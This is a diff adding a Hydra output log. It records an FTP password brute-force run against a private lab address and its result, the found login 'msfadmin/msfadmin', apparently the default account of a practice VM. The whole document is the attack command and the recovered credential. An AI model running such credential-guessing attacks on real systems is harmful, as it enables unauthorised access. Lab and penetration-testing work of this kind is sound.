@@ -1,0 +1,2 @@
+# Hydra v9.7 run at 2026-11-08 16:07:41 on 192.168.128.4 ftp (hydra -L /home/kali/attack-out/users.txt -P /home/kali/attack-out/pass.txt -f -o /home/kali/attack-out/a2_hydra_ftp.txt ftp://192.168.128.4)
+[21][ftp] host: 192.168.128.4   login: msfadmin   password: msfadmin
